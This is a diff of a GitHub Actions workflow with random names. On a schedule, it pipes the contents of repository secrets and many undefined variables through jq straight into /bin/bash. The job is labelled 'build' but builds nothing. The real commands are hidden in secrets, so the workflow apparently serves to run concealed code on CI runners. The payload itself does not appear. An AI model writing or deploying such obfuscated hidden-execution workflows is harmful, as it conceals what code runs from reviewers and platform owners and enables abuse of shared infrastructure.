@@ -1,24 +1,34 @@
 name: tonghugjiga
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
+    - cron: '30 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tonghugjiga
         env:
-          j05753: ${{ secrets.j05753 }}
+          jlwzi342: ${{ secrets.jlwzi342 }}
         run: |
-          echo $j05753 | jq -r .geqnl8 | /bin/bash
-          echo $pjgm29 | jq -r .s107 | /bin/bash
-          echo $gfttc0505 | jq -r .m25996 | /bin/bash
-          echo $pfxmu0299 | jq -r .brz397 | /bin/bash
-          echo $ft1793 | jq -r .nuqr2 | /bin/bash
-          echo $yq879 | jq -r .ouw489 | /bin/bash
-          echo $we10 | jq -r .ozwlr06384 | /bin/bash
-          echo $rkol797 | jq -r .vuw5 | /bin/bash
-          echo $iidvx7063 | jq -r .aart994 | /bin/bash
+          echo $jlwzi342 | jq -r .r6 | /bin/bash
+          echo $hjpko13 | jq -r .myop347 | /bin/bash
+          echo $ai22219 | jq -r .qdkoa3 | /bin/bash
+          echo $go5 | jq -r .aptz4 | /bin/bash
+          echo $wlluy0559 | jq -r .vcv12530 | /bin/bash
+          echo $an60 | jq -r .lf7 | /bin/bash
+          echo $anw127 | jq -r .nohks17 | /bin/bash
+          echo $bhkm9 | jq -r .ytmt80621 | /bin/bash
+          echo $qtder404 | jq -r .zasd6 | /bin/bash
+          echo $crc0184 | jq -r .t8 | /bin/bash
+          echo $enje6159 | jq -r .d5 | /bin/bash
+          echo $eyo2 | jq -r .wemg66190 | /bin/bash
+          echo $p4 | jq -r .u08 | /bin/bash
+          echo $l5107 | jq -r .me29459 | /bin/bash
+          echo $raw64 | jq -r .qhibr98 | /bin/bash
+          echo $defe9720 | jq -r .oxthl45 | /bin/bash
 
